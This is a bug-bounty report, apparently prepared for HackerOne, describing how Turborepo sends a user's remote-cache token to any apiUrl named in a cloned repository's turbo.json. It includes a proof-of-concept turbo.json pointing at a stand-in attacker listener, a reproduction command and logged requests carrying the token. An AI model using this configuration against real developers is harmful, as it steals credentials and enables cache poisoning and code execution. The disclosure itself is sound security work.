# HackerOne submission — copy/paste into the form fields

=====================================================================
FIELD: Asset
=====================================================================
Turborepo

=====================================================================
FIELD: Weakness
=====================================================================
Insufficiently Protected Credentials (CWE-522)
(alternative if you prefer: CWE-201 Insertion of Sensitive Information Into Sent Data)

=====================================================================
FIELD: Severity
=====================================================================
High

=====================================================================
FIELD: Affected version(s)
=====================================================================
turbo 2.10.11 (confirmed on the latest stable release at test time). Also present on `main`
(2.10.12-canary.0) and, per the code, all versions where the api-url origin-trust check is applied
only in the login flow.

=====================================================================
FIELD: Affected File  (GitHub link)
=====================================================================
https://github.com/vercel/turborepo/blob/main/crates/turborepo-lib/src/commands/mod.rs
(related: crates/turborepo-config/src/turbo_json.rs, crates/turborepo-auth/src/auth/mod.rs)

=====================================================================
FIELD: Description
=====================================================================
## Summary:
Turborepo honors `remoteCache.apiUrl`, `remoteCache.teamId`, and `remoteCache.teamSlug` from a
repository's `turbo.json` on the `turbo run` / build path. These fields are fully controlled by
whoever authors the repository. When a victim who holds a remote-cache token (from `turbo login`,
from the legacy `vercel login` credential that turbo falls back to, or from `TURBO_TOKEN` in CI)
clones such a repository and runs `turbo build`, Turborepo attaches the victim's
`Authorization: Bearer <token>` to the requests it sends to the attacker-chosen `apiUrl`.

The origin-trust check that would prevent pointing the cache at an untrusted host
(`is_trusted_vercel_origin` / `is_user_controlled_url_source` in
crates/turborepo-auth/src/auth/mod.rs) is only invoked from the `turbo login` / SSO flow. The
run/cache path (`api_auth` / `api_client` in crates/turborepo-lib/src/commands/mod.rs, wired from
crates/turborepo-lib/src/run/builder.rs) builds the API client against the merged `apiUrl` and
attaches the token with no such check. In crates/turborepo-config/src/turbo_json.rs only the token
is stripped from `turbo.json` (`opts.token = None`); `apiUrl`/`teamId`/`teamSlug` are accepted (the
crate's own test `test_remote_cache_options` asserts `config.api_url()` equals the value from
turbo.json). Because `turbo.json` wins the config merge whenever no higher-priority source set
`apiUrl` (env `TURBO_API` / CLI flag), and `teamId` from turbo.json marks the run "linked" (which
enables remote cache, default read+write), the token is exposed under default configuration.

## Steps To Reproduce:
(A self-contained PoC is attached as turbo-token-exfil-poc.zip.)

  1. Create a repository containing this malicious turbo.json:
     {
       "$schema": "https://turbo.build/schema.json",
       "remoteCache": { "enabled": true, "apiUrl": "http://127.0.0.1:9099", "teamId": "team_attacker_controlled" },
       "tasks": { "build": { "outputs": ["dist/**"] } }
     }
     and a package.json whose "build" script is any command (e.g. `echo built`).
  2. Start a listener that logs inbound Authorization headers (attacker's server stand-in):
     `node listener.js`  (included in the zip; listens on 127.0.0.1:9099)
  3. As the victim (who has a remote-cache token), run the build. In the PoC the token is supplied
     via `TURBO_TOKEN` to simulate the victim's stored login credential without needing a real
     account: `TURBO_TOKEN=VICTIM_SECRET_TOKEN_abc123 npx turbo build`
  4. Observe the victim token arriving at the attacker host.

## Supporting Material/References:
  * turbo-token-exfil-poc.zip — runnable PoC (package.json, turbo.json, listener.js, README, evidence.txt)
  * Observed on turbo 2.10.11 — four requests reached the attacker host, each carrying the token:
      GET  /v8/artifacts/status?teamId=team_attacker_controlled   Authorization: Bearer VICTIM_SECRET_TOKEN_abc123
      GET  /v8/artifacts/<hash>?teamId=team_attacker_controlled   Authorization: Bearer VICTIM_SECRET_TOKEN_abc123
      POST /v8/artifacts/events?teamId=team_attacker_controlled   Authorization: Bearer VICTIM_SECRET_TOKEN_abc123
      PUT  /v8/artifacts/<hash>?teamId=team_attacker_controlled   Authorization: Bearer VICTIM_SECRET_TOKEN_abc123
  * Root cause: crates/turborepo-config/src/turbo_json.rs (accepts apiUrl/teamId; strips only token);
    crates/turborepo-lib/src/commands/mod.rs (api_auth/api_client attach token, no source check);
    crates/turborepo-lib/src/run/builder.rs (initializes cache client when linked);
    crates/turborepo-auth/src/auth/mod.rs (is_trusted_vercel_origin gate is login-only).

## Suggested fix (optional):
Before attaching the token / initializing the remote-cache client on the run path, apply the same
gate already used for login: refuse to send credentials to an `apiUrl` whose configuration source
is `turbo.json` and whose host is not a trusted Vercel origin, unless the user explicitly opted in
to that custom cache host via a higher-trust source (env / flag / global config).

=====================================================================
FIELD: Impact
=====================================================================
## Summary:
An attacker who gets a victim to build a repository they control (a routine action for open-source
contributors and CI) steals the victim's Vercel/Turbo remote-cache token. That token grants remote
cache read AND write, so the attacker can then poison the victim's real remote cache with malicious
artifacts, which are restored into the victim's and CI's subsequent builds — leading to arbitrary
code execution. For Vercel account tokens (`vca_…`), the token additionally grants broader Vercel
API access. No pre-existing access to the victim's cache is required; the preconditions (has a token,
hasn't manually overridden apiUrl) are the normal default for Vercel/turbo users.
